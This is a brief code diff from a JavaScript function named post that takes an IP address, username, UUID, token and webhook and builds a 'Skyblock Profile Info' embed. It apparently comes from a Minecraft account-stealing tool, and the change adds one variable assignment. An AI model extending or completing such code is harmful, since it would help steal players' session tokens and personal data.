@@ -112,6 +112,8 @@ function post(ip, username, uuid, token, webhook, networth, description) {
         ]
     }
     
+    let embed = data;
+    
     if (description != null) {
         embed.embeds.push({
             title: "🌍 Skyblock Profile Info",
